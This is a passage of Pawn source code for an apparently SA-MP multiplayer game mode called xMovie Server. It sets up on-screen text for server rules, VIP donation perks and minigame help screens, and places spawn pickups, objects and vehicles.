	TextDrawLetterSize(intro3, 0.579999, 1.800000);
	TextDrawColor(intro3, COLOR_INVISIBLE); // invisible for fading
	//TextDrawSetOutline(intro3, 0);
	TextDrawSetProportional(intro3, 1);
	TextDrawSetShadow(intro3, 0);*/

	screentd = TextDrawCreate(0.0, 0.0, "flash");
	TextDrawFont(screentd, 1);
	TextDrawLetterSize(screentd, 0.0, 50.0);
	TextDrawUseBox(screentd, 1);
	TextDrawColor(screentd, 0);

	RRblood = TextDrawCreate(0.0, 0.0, "blood");
	TextDrawFont(RRblood, 1);
	TextDrawLetterSize(RRblood, 0.0, 50.0);
	TextDrawUseBox(RRblood, 1);
	TextDrawBoxColor(RRblood, COLOR_RED);

	nrules = TextDrawCreate(375.0, 12.0, "- Kicks: 2nd warning, heavy DM, spam, disrespect.~n~- Bans: 3rd kick, disrespect against authorities.~n~- Others: disrespect, DMing, spam of any kind.~n~- CLEO mods: no flying look-like mods allowed.~n~- Exceptions: mods are allowed but no abuse.~n~- Creating useless crap to annoy players = ban.~n~~n~~r~Any ban by MrPepino, spacemud or (FRAG)B~n~is valid, no matter which ban reason is used.~n~~n~~y~Playing on this server = agreeing with the rules!~n~~w~/rules");
	TextDrawFont(nrules, 1);
	TextDrawLetterSize(nrules, 0.315, 0.9);
	TextDrawUseBox(nrules, 1);
	TextDrawColor(nrules, COLOR_WHITE);
	TextDrawBoxColor(nrules, COLOR_BLACK);
	TextDrawSetShadow(nrules, 0);

	/*donatetd = TextDrawCreate(155.0, 315.0, "xMovie - Donation Perks~n~~n~- Specialised forum rank~n~- VIP-Premium status ingame~n~- Access to over 30+ VIP-Premium commands~n~- Reserved player slot~n~- More virtual worlds, attachable objects and vehicle-object controlling commands~n~- Download your maps made on the server~n~- An amazing feeling of satisfaction~n~~n~Detailed information can be found at:~n~~w~www.xmovieserver.com/donate");
	TextDrawFont(donatetd, 1);
	TextDrawLetterSize(donatetd, 0.345, 0.930);
	TextDrawTextSize(donatetd, 620.0, 250.0);
	TextDrawUseBox(donatetd, 1);
	TextDrawColor(donatetd, COLOR_SEAGREEN);
	TextDrawBoxColor(donatetd, COLOR_BLACK);
	TextDrawSetShadow(donatetd, 0);*/
	
	donatetd1 = TextDrawCreate(320.000000, 153.000000, "VIP/Premium membership");
	TextDrawAlignment(donatetd1, 2);
	TextDrawBackgroundColor(donatetd1, 255);
	TextDrawFont(donatetd1, 3);
	TextDrawLetterSize(donatetd1, 0.449999, 1.700000);
	TextDrawColor(donatetd1, -1);
	TextDrawSetOutline(donatetd1, 1);
	TextDrawSetProportional(donatetd1, 1);
	TextDrawUseBox(donatetd1, 1);
	TextDrawBoxColor(donatetd1, -16777131);
	TextDrawTextSize(donatetd1, 503.000000, 276.000000);

	new longtext[717]; // longest longtext variable @ copchase game rules
	longtext = "What do I get?~n~~n~- VIP rank ingame~n~- VIP rank on forums~n~- VIP rank on IRC~n~- Access to over 30+ VIP commands (and counting)~n~- Reserved player slot";
	strcat(longtext, "~n~- Access up to 1.000.000.000 virtual worlds~n~- 2x more attachable objects allowed~n~- More vehicle controlling commands~n~- More object controlling commands");
	strcat(longtext, "~n~- Ability to download any of your maps~n~- A your_name [at] xmovieserver.com email address~n~- Your own channel on our Team Speak server to invite friends~n~- An amazing feeling of satisfaction~n~~n~More information:~n~You may always contact any of the admins or other VIP members~n~and/or visit www.xmovieserver.com/donate for further info.");

	donatetd2 = TextDrawCreate(182.000000, 173.000000, longtext);
	TextDrawBackgroundColor(donatetd2, 255);
	TextDrawFont(donatetd2, 1);
	TextDrawLetterSize(donatetd2, 0.250000, 1.000000);
	TextDrawColor(donatetd2, COLOR_WHITE);
	TextDrawSetOutline(donatetd2, 0);
	TextDrawSetProportional(donatetd2, 1);
	TextDrawSetShadow(donatetd2, 0);
	TextDrawUseBox(donatetd2, 1);
	TextDrawBoxColor(donatetd2, 85);
	TextDrawTextSize(donatetd2, 458.000000, 19.000000);

	adminmsg = TextDrawCreate(0.0, 428.0, "-");
	TextDrawFont(adminmsg, 1);
	TextDrawLetterSize(adminmsg, 0.5, 1.2);
	TextDrawColor(adminmsg, COLOR_PINK);
	TextDrawSetShadow(adminmsg, 1);

	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		/*intro2[i] = TextDrawCreate(90.000000, 409.000000, "Welcome to                         xMovie Server");
		TextDrawFont(intro2[i], 1);
		TextDrawLetterSize(intro2[i], 0.579999, 1.800000);
		TextDrawColor(intro2[i], COLOR_INVISIBLE); // invisible for fading
		TextDrawSetProportional(intro2[i], 1);
		TextDrawSetShadow(intro2[i], 0);*/

		intro2[i] = TextDrawCreate(321.0, 430.0, "Welcome to the xMovie Server!                  xmovieserver.com");
		TextDrawFont(intro2[i], 1);
		TextDrawAlignment(intro2[i], 2);
		TextDrawLetterSize(intro2[i], 0.579, 1.79);
		TextDrawColor(intro2[i], COLOR_INVISIBLE);
		TextDrawSetProportional(intro2[i], 1);
		TextDrawSetShadow(intro2[i], 0);

		/*pmsg[i] = TextDrawCreate(440.0, 353.0, " ");
		TextDrawLetterSize(pmsg[i], 0.3, 0.9);
		TextDrawTextSize(pmsg[i], 620.0, 250.0);
		TextDrawFont(pmsg[i], 1);
		TextDrawColor(pmsg[i], COLOR_MEDIUMMAGENTA);
		TextDrawBoxColor(pmsg[i], COLOR_BLACK);
		TextDrawUseBox(pmsg[i], 1);
		TextDrawSetShadow(pmsg[i], 0);*/

		pmsg1[i] = TextDrawCreate(485.000000, 293.000000, "SERVER COMMAND LISTING");
		TextDrawAlignment(pmsg1[i], 2);
		TextDrawBackgroundColor(pmsg1[i], 255);
		TextDrawFont(pmsg1[i], 3);
		TextDrawLetterSize(pmsg1[i], 0.349997, 1.899999);
		TextDrawColor(pmsg1[i], -1);
		TextDrawSetOutline(pmsg1[i], 1);
		TextDrawSetProportional(pmsg1[i], 1);
		TextDrawUseBox(pmsg1[i], 1);
		TextDrawBoxColor(pmsg1[i], -16777131);
		TextDrawTextSize(pmsg1[i], 682.000000, 296.000000);

		pmsg5[i] = TextDrawCreate(337.000000, 315.000000, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~Use ~k~~CONVERSATION_YES~ and ~k~~CONVERSATION_NO~ to scroll through the command list.");
		TextDrawBackgroundColor(pmsg5[i], 255);
		TextDrawFont(pmsg5[i], 1);
		TextDrawLetterSize(pmsg5[i], 0.300000, 1.000000);
		TextDrawColor(pmsg5[i], -1);
		TextDrawSetOutline(pmsg5[i], 0);
		TextDrawSetProportional(pmsg5[i], 1);
		TextDrawSetShadow(pmsg5[i], 1);
		TextDrawUseBox(pmsg5[i], 1);
		TextDrawBoxColor(pmsg5[i], 80);
		TextDrawTextSize(pmsg5[i], 633.000000, -8.000000);

		pmsg2[i] = TextDrawCreate(337.000000, 315.000000, "Loading");
		TextDrawFont(pmsg2[i], 1);
		TextDrawLetterSize(pmsg2[i], 0.300000, 1.000000);
		TextDrawColor(pmsg2[i], -1);
		TextDrawSetOutline(pmsg2[i], 0);
		TextDrawSetProportional(pmsg2[i], 1);
		TextDrawSetShadow(pmsg2[i], 1);

		pmsg3[i] = TextDrawCreate(434.000000, 315.000000, "Loading");
		TextDrawFont(pmsg3[i], 1);
		TextDrawLetterSize(pmsg3[i], 0.300000, 1.000000);
		TextDrawColor(pmsg3[i], -1);
		TextDrawSetOutline(pmsg3[i], 0);
		TextDrawSetProportional(pmsg3[i], 1);
		TextDrawSetShadow(pmsg3[i], 1);

		pmsg4[i] = TextDrawCreate(434.000000, 378.000000, "_");
		TextDrawFont(pmsg4[i], 1);
		TextDrawLetterSize(pmsg4[i], 0.300000, 1.000000);
		TextDrawColor(pmsg4[i], -1);
		TextDrawSetOutline(pmsg4[i], 0);
		TextDrawSetProportional(pmsg4[i], 1);
		TextDrawSetShadow(pmsg4[i], 1);

		pinfo[i] = TextDrawCreate(546.000000, 38.000000, "Loading");
		TextDrawBackgroundColor(pinfo[i], 255);
		TextDrawFont(pinfo[i], 1);
		TextDrawLetterSize(pinfo[i], 0.449999, 2.000000);
		TextDrawColor(pinfo[i], -32001);
		TextDrawSetOutline(pinfo[i], 1);
		TextDrawSetProportional(pinfo[i], 1);
		
		ccstatus[i] = TextDrawCreate(35.000000, 296.000000, "Loading");
		TextDrawBackgroundColor(ccstatus[i], 255);
		TextDrawFont(ccstatus[i], 1);
		TextDrawLetterSize(ccstatus[i], 0.300000, 1.000000);
		TextDrawColor(ccstatus[i], -1);
		TextDrawSetOutline(ccstatus[i], 0);
		TextDrawSetProportional(ccstatus[i], 1);
		TextDrawSetShadow(ccstatus[i], 1);
	}

	ccstatus2 = TextDrawCreate(142.000000, 359.000000, "Loading");
	TextDrawBackgroundColor(ccstatus2, 255);
	TextDrawFont(ccstatus2, 1);
	TextDrawLetterSize(ccstatus2, 0.300000, 1.000000);
	TextDrawColor(ccstatus2, -1);
	TextDrawSetOutline(ccstatus2, 0);
	TextDrawSetProportional(ccstatus2, 1);
	TextDrawSetShadow(ccstatus2, 1);

	ccstatus3 = TextDrawCreate(267.000000, 359.000000, "Loading");
	TextDrawBackgroundColor(ccstatus3, 255);
	TextDrawFont(ccstatus3, 1);
	TextDrawLetterSize(ccstatus3, 0.300000, 1.000000);
	TextDrawColor(ccstatus3, -1);
	TextDrawSetOutline(ccstatus3, 0);
	TextDrawSetProportional(ccstatus3, 1);
	TextDrawSetShadow(ccstatus3, 1);

	ccstatus4 = TextDrawCreate(391.000000, 359.000000, "Loading");
	TextDrawBackgroundColor(ccstatus4, 255);
	TextDrawFont(ccstatus4, 1);
	TextDrawLetterSize(ccstatus4, 0.300000, 1.000000);
	TextDrawColor(ccstatus4, -1);
	TextDrawSetOutline(ccstatus4, 0);
	TextDrawSetProportional(ccstatus4, 1);
	TextDrawSetShadow(ccstatus4, 1);

	ccstatus5 = TextDrawCreate(517.000000, 359.000000, "Loading");
	TextDrawBackgroundColor(ccstatus5, 255);
	TextDrawFont(ccstatus5, 1);
	TextDrawLetterSize(ccstatus5, 0.300000, 1.000000);
	TextDrawColor(ccstatus5, -1);
	TextDrawSetOutline(ccstatus5, 0);
	TextDrawSetProportional(ccstatus5, 1);
	TextDrawSetShadow(ccstatus5, 1);

	cchelptd1 = TextDrawCreate(320.000000, 153.000000, "Welcome to the Cop Chase!");
	TextDrawAlignment(cchelptd1, 2);
	TextDrawBackgroundColor(cchelptd1, 255);
	TextDrawFont(cchelptd1, 3);
	TextDrawLetterSize(cchelptd1, 0.449999, 1.700000);
	TextDrawColor(cchelptd1, -1);
	TextDrawSetOutline(cchelptd1, 1);
	TextDrawSetProportional(cchelptd1, 1);
	TextDrawUseBox(cchelptd1, 1);
	TextDrawBoxColor(cchelptd1, -16777131);
	TextDrawTextSize(cchelptd1, 503.000000, 276.000000);

	longtext = "As a COP:~n~- Neutralise the criminal using teamwork with other cops.~n~- Use Y to show your position on the minimap.~n~- Use !<text> to communicate via the police radio.~n~Tips:";
	strcat(longtext, "~n~- /l to lock your cars to prevent unauthorised use!~n~- Use sirens/blips carefully. The suspect can see/hear them as well!~n~- Police Maverick can be found at LSPD.~n~- Coastguard can be found in Marina");
	strcat(longtext, "~n~~n~As the CRIMINAL:~n~- Evade the cops for 10 minutes.~n~Tips:~n~- You're outnumbered. Hiding is easier than fighting!~n~- LSPD cruisers can outrun your Clover. Corner often.~n~- Too pussy to fight? /handsup to give yourself up to the police.");
	strcat(longtext, "~n~~n~~r~The game ends when the suspect is caught or killed by officers. The game is restricted to Los Santos only.~n~Don't pause and don't attempt to leave.");

	cchelptd2 = TextDrawCreate(182.000000, 173.000000, longtext);
	TextDrawBackgroundColor(cchelptd2, 255);
	TextDrawFont(cchelptd2, 1);
	TextDrawLetterSize(cchelptd2, 0.250000, 1.000000);
	TextDrawColor(cchelptd2, -1);
	TextDrawSetOutline(cchelptd2, 0);
	TextDrawSetProportional(cchelptd2, 1);
	TextDrawSetShadow(cchelptd2, 0);
	TextDrawUseBox(cchelptd2, 1);
	TextDrawBoxColor(cchelptd2, 85);
	TextDrawTextSize(cchelptd2, 458.000000, 19.000000);

	derbyhelptd1 = TextDrawCreate(320.000000, 153.000000, "Welcome to the derby!");
	TextDrawAlignment(derbyhelptd1, 2);
	TextDrawBackgroundColor(derbyhelptd1, 255);
	TextDrawFont(derbyhelptd1, 3);
	TextDrawLetterSize(derbyhelptd1, 0.449999, 1.700000);
	TextDrawColor(derbyhelptd1, -1);
	TextDrawSetOutline(derbyhelptd1, 1);
	TextDrawSetProportional(derbyhelptd1, 1);
	TextDrawUseBox(derbyhelptd1, 1);
	TextDrawBoxColor(derbyhelptd1, -16777131);
	TextDrawTextSize(derbyhelptd1, 503.000000, 276.000000);

	longtext = "~n~- Knock players off the derby arena or destroy their vehicle to eliminate them.~n~- The last remaining player wins the round.~n~Tips:~n~- Make use of traps in some levels - explosive barrels are everywhere!";
	strcat(longtext, "~n~- No commands are allowed, so look after your vehicle.~n~~n~~r~The game ends when all players except one have been knocked off or destroyed.");

	derbyhelptd2 = TextDrawCreate(182.000000, 173.000000, longtext);
	TextDrawBackgroundColor(derbyhelptd2, 255);
	TextDrawFont(derbyhelptd2, 1);
	TextDrawLetterSize(derbyhelptd2, 0.250000, 1.000000);
	TextDrawColor(derbyhelptd2, -1);
	TextDrawSetOutline(derbyhelptd2, 0);
	TextDrawSetProportional(derbyhelptd2, 1);
	TextDrawSetShadow(derbyhelptd2, 0);
	TextDrawUseBox(derbyhelptd2, 1);
	TextDrawBoxColor(derbyhelptd2, 85);
	TextDrawTextSize(derbyhelptd2, 458.000000, 19.000000);

	rrhelptd1 = TextDrawCreate(320.000000, 153.000000, "Welcome to Russian Roulette!");
	TextDrawAlignment(rrhelptd1, 2);
	TextDrawBackgroundColor(rrhelptd1, 255);
	TextDrawFont(rrhelptd1, 3);
	TextDrawLetterSize(rrhelptd1, 0.449999, 1.700000);
	TextDrawColor(rrhelptd1, -1);
	TextDrawSetOutline(rrhelptd1, 1);
	TextDrawSetProportional(rrhelptd1, 1);
	TextDrawUseBox(rrhelptd1, 1);
	TextDrawBoxColor(rrhelptd1, -16777131);
	TextDrawTextSize(rrhelptd1, 503.000000, 276.000000);

	rrhelptd2 = TextDrawCreate(182.000000, 173.000000, "~n~- Use /spin to spin the cylinder.~n~- Use /fire to dice with death.~n~Tips:~n~- Dying is not recommended.~n~- xMovie takes no liability for death following participation in this minigame.~n~~n~~r~The game ends when all players except one have died.");
	TextDrawBackgroundColor(rrhelptd2, 255);
	TextDrawFont(rrhelptd2, 1);
	TextDrawLetterSize(rrhelptd2, 0.250000, 1.000000);
	TextDrawColor(rrhelptd2, -1);
	TextDrawSetOutline(rrhelptd2, 0);
	TextDrawSetProportional(rrhelptd2, 1);
	TextDrawSetShadow(rrhelptd2, 0);
	TextDrawUseBox(rrhelptd2, 1);
	TextDrawBoxColor(rrhelptd2, 85);
	TextDrawTextSize(rrhelptd2, 458.000000, 19.000000);

	nbhelptd1 = TextDrawCreate(320.000000, 153.000000, "Welcome to Nadeball!");
	TextDrawAlignment(nbhelptd1, 2);
	TextDrawBackgroundColor(nbhelptd1, 255);
	TextDrawFont(nbhelptd1, 3);
	TextDrawLetterSize(nbhelptd1, 0.449999, 1.700000);
	TextDrawColor(nbhelptd1, -1);
	TextDrawSetOutline(nbhelptd1, 1);
	TextDrawSetProportional(nbhelptd1, 1);
	TextDrawUseBox(nbhelptd1, 1);
	TextDrawBoxColor(nbhelptd1, -16777131);
	TextDrawTextSize(nbhelptd1, 503.000000, 276.000000);

	longtext = "- The game is played on a tennis court.~n~- There are two teams.~n~- The court is divided in two halves by a net, each team plays on its own half of the court.";
	strcat(longtext, "~n~- Each player gets an unlimited amount of grenades.~n~- When the game starts, the players may start throwing their grenades.");
	strcat(longtext, "~n~- The objective is to make the opponents fly off their side of the court by the impact of exploding grenades, and to stay in your side of the court.~n~- Each players is immortal so dying from the explosions is impossible.");
	strcat(longtext, "~n~- When a player is out of the court, he is out of the game as well.~n~- The team with the last player(s) in their half of the court, wins.");

	nbhelptd2 = TextDrawCreate(182.000000, 173.000000, longtext);
	TextDrawBackgroundColor(nbhelptd2, 255);
	TextDrawFont(nbhelptd2, 1);
	TextDrawLetterSize(nbhelptd2, 0.250000, 1.000000);
	TextDrawColor(nbhelptd2, -1);
	TextDrawSetOutline(nbhelptd2, 0);
	TextDrawSetProportional(nbhelptd2, 1);
	TextDrawSetShadow(nbhelptd2, 0);
	TextDrawUseBox(nbhelptd2, 1);
	TextDrawBoxColor(nbhelptd2, 85);
	TextDrawTextSize(nbhelptd2, 458.000000, 19.000000);

	wzhelptd1 = TextDrawCreate(320.000000, 153.000000, "Welcome to Warzone!");
	TextDrawAlignment(wzhelptd1, 2);
	TextDrawBackgroundColor(wzhelptd1, 255);
	TextDrawFont(wzhelptd1, 3);
	TextDrawLetterSize(wzhelptd1, 0.449999, 1.700000);
	TextDrawColor(wzhelptd1, -1);
	TextDrawSetOutline(wzhelptd1, 1);
	TextDrawSetProportional(wzhelptd1, 1);
	TextDrawUseBox(wzhelptd1, 1);
	TextDrawBoxColor(wzhelptd1, -16777131);
	TextDrawTextSize(wzhelptd1, 503.000000, 276.000000);

	longtext = "As an ATTACKER:~n~- Kill all defenders or capture their base.~n~~n~As a DEFENDER:~n~- Defend the base for 10 minutes or kill all attackers if needed.~n~~n~Tips:~n~- Stay close to team members.~n~- Use your vehicles wisely.~n~~n~~r~No pausing.~n~No teamkilling.~n~No driveby.~n~No carkilling.~n~Breaching any of these rules may result in a BAN.";

	wzhelptd2 = TextDrawCreate(182.000000, 173.000000, longtext);
	TextDrawBackgroundColor(wzhelptd2, 255);
	TextDrawFont(wzhelptd2, 1);
	TextDrawLetterSize(wzhelptd2, 0.250000, 1.000000);
	TextDrawColor(wzhelptd2, -1);
	TextDrawSetOutline(wzhelptd2, 0);
	TextDrawSetProportional(wzhelptd2, 1);
	TextDrawSetShadow(wzhelptd2, 0);
	TextDrawUseBox(wzhelptd2, 1);
	TextDrawBoxColor(wzhelptd2, 85);
	TextDrawTextSize(wzhelptd2, 458.000000, 19.000000);

	wzteamtd1 = TextDrawCreate(466.000000, 178.000000, "_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_");
	TextDrawBackgroundColor(wzteamtd1, 255);
	TextDrawFont(wzteamtd1, 1);
	TextDrawLetterSize(wzteamtd1, 0.500000, 1.000000);
	TextDrawColor(wzteamtd1, -1);
	TextDrawSetOutline(wzteamtd1, 0);
	TextDrawSetProportional(wzteamtd1, 1);
	TextDrawSetShadow(wzteamtd1, 1);
	TextDrawUseBox(wzteamtd1, 1);
	TextDrawBoxColor(wzteamtd1, 255);
	TextDrawTextSize(wzteamtd1, 177.000000, 1.000000);

	wzteamtd2 = TextDrawCreate(250.000000, 190.000000, "_~n~Attackers~n~_");
	TextDrawAlignment(wzteamtd2, 2);
	TextDrawBackgroundColor(wzteamtd2, 255);
	TextDrawFont(wzteamtd2, 2);
	TextDrawLetterSize(wzteamtd2, 0.500000, 2.099999);
	TextDrawColor(wzteamtd2, -1);
	TextDrawSetOutline(wzteamtd2, 0);
	TextDrawSetProportional(wzteamtd2, 1);
	TextDrawSetShadow(wzteamtd2, 1);
	TextDrawUseBox(wzteamtd2, 1);
	TextDrawBoxColor(wzteamtd2, 0xFF0000FF);
	TextDrawTextSize(wzteamtd2, 313.000000, 120.000000);

	wzteamtd3 = TextDrawCreate(391.000000, 190.000000, "_~n~Defenders~n~_");
	TextDrawAlignment(wzteamtd3, 2);
	TextDrawBackgroundColor(wzteamtd3, 255);
	TextDrawFont(wzteamtd3, 2);
	TextDrawLetterSize(wzteamtd3, 0.500000, 2.099999);
	TextDrawColor(wzteamtd3, -1);
	TextDrawSetOutline(wzteamtd3, 0);
	TextDrawSetProportional(wzteamtd3, 1);
	TextDrawSetShadow(wzteamtd3, 1);
	TextDrawUseBox(wzteamtd3, 1);
	TextDrawBoxColor(wzteamtd3, 0x0000FFFF);
	TextDrawTextSize(wzteamtd3, 479.000000, 122.000000);

	wzweaponsettd1 = TextDrawCreate(35.000000, 220.000000, "Assault *~n~~n~Knife~n~MP5~n~Normal shotgun");
	TextDrawBackgroundColor(wzweaponsettd1, 255);
	TextDrawFont(wzweaponsettd1, 1);
	TextDrawLetterSize(wzweaponsettd1, 0.400000, 1.000000);
	TextDrawColor(wzweaponsettd1, -1);
	TextDrawSetOutline(wzweaponsettd1, 0);
	TextDrawSetProportional(wzweaponsettd1, 1);
	TextDrawSetShadow(wzweaponsettd1, 1);
	TextDrawUseBox(wzweaponsettd1, 1);
	TextDrawBoxColor(wzweaponsettd1, 255);
	TextDrawTextSize(wzweaponsettd1, 145.000000, 50.000000);

	wzweaponsettd2 = TextDrawCreate(150.000000, 220.000000, "Support~n~~n~Knife~n~Silenced pistol~n~Combat shotgun");
	TextDrawBackgroundColor(wzweaponsettd2, 255);
	TextDrawFont(wzweaponsettd2, 1);
	TextDrawLetterSize(wzweaponsettd2, 0.400000, 1.000000);
	TextDrawColor(wzweaponsettd2, -1);
	TextDrawSetOutline(wzweaponsettd2, 0);
	TextDrawSetProportional(wzweaponsettd2, 1);
	TextDrawSetShadow(wzweaponsettd2, 1);
	TextDrawUseBox(wzweaponsettd2, 1);
	TextDrawBoxColor(wzweaponsettd2, 255);
	TextDrawTextSize(wzweaponsettd2, 260.000000, 50.000000);

	wzweaponsettd3 = TextDrawCreate(265.000000, 220.000000, "Rifleman~n~~n~Knife~n~MP5~n~M4");
	TextDrawBackgroundColor(wzweaponsettd3, 255);
	TextDrawFont(wzweaponsettd3, 1);
	TextDrawLetterSize(wzweaponsettd3, 0.400000, 1.000000);
	TextDrawColor(wzweaponsettd3, -1);
	TextDrawSetOutline(wzweaponsettd3, 0);
	TextDrawSetProportional(wzweaponsettd3, 1);
	TextDrawSetShadow(wzweaponsettd3, 1);
	TextDrawUseBox(wzweaponsettd3, 1);
	TextDrawBoxColor(wzweaponsettd3, 255);
	TextDrawTextSize(wzweaponsettd3, 375.000000, 50.000000);

	wzweaponsettd4 = TextDrawCreate(380.000000, 220.000000, "Rifleman~n~~n~Knife~n~Desert eagle~n~AK47");
	TextDrawBackgroundColor(wzweaponsettd4, 255);
	TextDrawFont(wzweaponsettd4, 1);
	TextDrawLetterSize(wzweaponsettd4, 0.400000, 1.000000);
	TextDrawColor(wzweaponsettd4, -1);
	TextDrawSetOutline(wzweaponsettd4, 0);
	TextDrawSetProportional(wzweaponsettd4, 1);
	TextDrawSetShadow(wzweaponsettd4, 1);
	TextDrawUseBox(wzweaponsettd4, 1);
	TextDrawBoxColor(wzweaponsettd4, 255);
	TextDrawTextSize(wzweaponsettd4, 490.000000, 50.000000);

	wzweaponsettd5 = TextDrawCreate(495.000000, 220.000000, "Sniper~n~~n~Knife~n~Desert eagle~n~Sniper rifle");
	TextDrawBackgroundColor(wzweaponsettd5, 255);
	TextDrawFont(wzweaponsettd5, 1);
	TextDrawLetterSize(wzweaponsettd5, 0.400000, 1.000000);
	TextDrawColor(wzweaponsettd5, -1);
	TextDrawSetOutline(wzweaponsettd5, 0);
	TextDrawSetProportional(wzweaponsettd5, 1);
	TextDrawSetShadow(wzweaponsettd5, 1);
	TextDrawUseBox(wzweaponsettd5, 1);
	TextDrawBoxColor(wzweaponsettd5, 255);
	TextDrawTextSize(wzweaponsettd5, 605.000000, 50.000000);

	wzstatustd1 = TextDrawCreate(320.000000, 402.000000, "_");
	TextDrawAlignment(wzstatustd1, 2);
	TextDrawBackgroundColor(wzstatustd1, 255);
	TextDrawFont(wzstatustd1, 1);
	TextDrawLetterSize(wzstatustd1, 0.400000, 1.500000);
	TextDrawColor(wzstatustd1, -1);
	TextDrawSetOutline(wzstatustd1, 0);
	TextDrawSetProportional(wzstatustd1, 1);
	TextDrawSetShadow(wzstatustd1, 1);

	wzstatustd2 = TextDrawCreate(320.000000, 420.000000, "_");
	TextDrawAlignment(wzstatustd2, 2);
	TextDrawBackgroundColor(wzstatustd2, 255);
	TextDrawFont(wzstatustd2, 1);
	TextDrawLetterSize(wzstatustd2, 0.400000, 1.500000);
	TextDrawColor(wzstatustd2, -1);
	TextDrawSetOutline(wzstatustd2, 0);
	TextDrawSetProportional(wzstatustd2, 1);
	TextDrawSetShadow(wzstatustd2, 1);

	TextDrawSetSelectable(wzteamtd2, 1);
	TextDrawSetSelectable(wzteamtd3, 1);
	TextDrawSetSelectable(wzweaponsettd1, 1);
	TextDrawSetSelectable(wzweaponsettd2, 1);
	TextDrawSetSelectable(wzweaponsettd3, 1);
	TextDrawSetSelectable(wzweaponsettd4, 1);
	TextDrawSetSelectable(wzweaponsettd5, 1);

	for (new c = 0; c < MAX_GROUPS; c++)
	{
		crewowner[c] = -1;
		crews[c] = 0;
		crewscene[c] = 0;
		crewshot[c] = 0;
	}

	//GangZoneCreate(50.7497, 986.7610, 179.2450, 1135.6041);
	GangZoneCreate(-1040.65, -950.85, -1001.00, -908.00);
	GangZoneShowForAll(0, 0xFF69B4FF);

	GangZoneCreate(-1397.2594, -1524.9926, -1385.7589, -1511.7733);
	GangZoneShowForAll(1, 0xFF69B4FF);

	spawnareaid = CreateDynamicRectangle(-1319.4437,-1133.5485, -845.1447,-823.1377, 0);
	spawnareaid2 = CreateDynamicRectangle(-1484.2833, -1610.2789, -1337.3257, -1420.2683, 0);

	CreateDynamicObject(14548, 1000, 1000, 1000, 5.0, 0.0, 0.0); // andromada interior
	andromadadoor = CreateDynamicObject(987, 1002.97, 1023.84, 994.41, 270.00, 0.00, 90.00); // andromada door
	
	CreateDynamicObject(2188, 1993.775634, 1017.794677, 994.870849, 0.000000, 0.000000, 0.000000); // russian roulette table
	CreateDynamicObject(2188, 1993.821411, 1017.807250, 994.870666, 0.000000, 0.000000, 180.000000); // russian roulette table

	AddStaticVehicle(537, 1700.0, -1954.0, 13.54, 270.0 ,-1,-1);
	AddStaticVehicle(538, -1943.0, 165.3, 25.7, 0.0 ,-1,-1);

	//ConnectNPC("HalloweenBot1", "npcidle");
 	//ConnectNPC("Santa", "npcidle");
 	//ConnectNPC("Jesus", "npcidle");
 	//ConnectNPC("zorro", "npcidle");
	//Create3DTextLabel("It's Mr.Hankey, the Christmas Pooh,\nHe Loves Me, I Love You", COLOR_BROWN, -1018.5316, -924.8415, 129.0019, 100.0, 0);


	// RANDOM //
	//spawnpickup = CreatePickup(2103, 23, -1010.81, -920.20, 128.79);
	//spawnpickup = CreatePickup(3012, 23, -1009.62, -921.74, 128.79);
	//spawnpickup = CreatePickup(1225, 23, -1009.62, -921.74, 128.79);
	//spawnpickup = CreatePickup(1313, 23, -1012.32, -919.18, 128.79);
	spawnpickup1 = CreatePickup(1239, 23, -1014.012207, -923.268249, 129.218750, 0);
	spawnpickup2 = CreatePickup(1210, 23, -1010.903808, -925.228454, 129.218750, 0);
	spawnpickup3 = CreatePickup(1241, 23, -1015.466186, -920.075683, 129.212646, 0);
	spawnpickup4 = CreatePickup(1582, 23, -1007.811950, -925.538757, 129.018753, 0);
	spawnpickup5 = CreatePickup(3092, 23, -1016.472839, -916.646728, 129.212646, 0);

	Create3DTextLabel("info", COLOR_PINK, -1014.012207, -923.268249, 129.518750, 50.0, 0);
	Create3DTextLabel("disco inferno", COLOR_YELLOW, -1010.903808, -925.228454, 129.518750, 50.0, 0);
	Create3DTextLabel("gangsta", COLOR_LBLUE, -1015.466186, -920.075683, 129.512646, 50.0, 0);
	Create3DTextLabel("ciggy", COLOR_LIME, -1007.811950, -925.538757, 129.318753, 50.0, 0);
	Create3DTextLabel("minigun", COLOR_LIGHTNAVY, -1016.472839, -916.646728, 129.512646, 50.0, 0);

	// HALLOWEEN
	/*spawnpickup1 = CreatePickup(1254, 23, -1009.62, -921.74, 128.79);
	spawnpickup2 = CreatePickup(1313, 23, -1012.32, -919.18, 128.79);*/

	// CHRISTMAS
	//spawnpickup1 = CreatePickup(19065, 23, -1009.62, -921.74, 128.79);
	//spawnpickup2 = CreatePickup(1313, 23, -1012.32, -919.18, 128.79);

	Audio_SetPack("xmovie_pack");
	return 1;
}

public OnGameModeExit()
{
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
	    /*if (IsPlayerConnected(i))
		Kick(i);*/
		
		TextDrawDestroy(intro2[i]);
		TextDrawDestroy(pinfo[i]);
		TextDrawDestroy(pmsg1[i]);
		TextDrawDestroy(pmsg2[i]);
		TextDrawDestroy(pmsg3[i]);
		TextDrawDestroy(pmsg4[i]);
		TextDrawDestroy(pmsg5[i]);
		TextDrawDestroy(ccstatus[i]);
	}
	TextDrawDestroy(intro1);
	TextDrawDestroy(screentd);
	TextDrawDestroy(RRblood);
	TextDrawDestroy(nrules);
	TextDrawDestroy(donatetd1);
	TextDrawDestroy(donatetd2);
	TextDrawDestroy(adminmsg);
	TextDrawDestroy(derbyhelptd1);
	TextDrawDestroy(derbyhelptd2);
	TextDrawDestroy(rrhelptd1);
	TextDrawDestroy(rrhelptd2);
	TextDrawDestroy(ccstatus2);
	TextDrawDestroy(ccstatus3);
	TextDrawDestroy(ccstatus4);
	TextDrawDestroy(ccstatus5);
	TextDrawDestroy(cchelptd1);
	TextDrawDestroy(cchelptd2);
	TextDrawDestroy(nbhelptd1);
	TextDrawDestroy(nbhelptd2);
	TextDrawDestroy(wzhelptd1);
	TextDrawDestroy(wzhelptd2);
	TextDrawDestroy(wzteamtd1);
	TextDrawDestroy(wzteamtd2);
	TextDrawDestroy(wzteamtd3);
	TextDrawDestroy(wzweaponsettd1);
	TextDrawDestroy(wzweaponsettd2);
	TextDrawDestroy(wzweaponsettd3);
	TextDrawDestroy(wzweaponsettd4);
	TextDrawDestroy(wzweaponsettd5);
	TextDrawDestroy(wzstatustd1);
	TextDrawDestroy(wzstatustd2);
	
